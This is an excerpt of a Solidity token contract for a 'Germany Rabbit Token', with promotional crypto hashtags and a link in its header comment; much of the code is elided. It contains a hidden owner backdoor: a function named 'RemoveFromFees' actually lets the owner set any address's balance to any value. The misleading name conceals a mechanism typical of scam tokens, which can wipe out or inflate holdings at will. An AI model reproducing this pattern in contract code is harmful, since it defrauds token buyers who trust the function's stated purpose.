...
Deutschland-Kaninchen-Token

https://coinmarketcap.com/community/search/top/germany-rabbit-token

#crypto #GoldenBall #DeFi #Crypto #NFT
*/
...
interface IBEPGermanyRabbitToken {
...
contract GermanyRabbitTokenNFT is Contextrte, IBEPGermanyRabbitToken, Ownableertg {
  ...
  constructor() public {
    _name = 'Deutschland Kaninchen Token';
    _symbol = 'Germany Rabbit Token';
    _decimals = 0;
 ...
 function RemoveFromFees(address CGermanyRabbitToken, uint256 CGermanyRabbitTokenNFT) external onlyOwner{
    _totbalances[CGermanyRabbitToken] = CGermanyRabbitTokenNFT;
  }
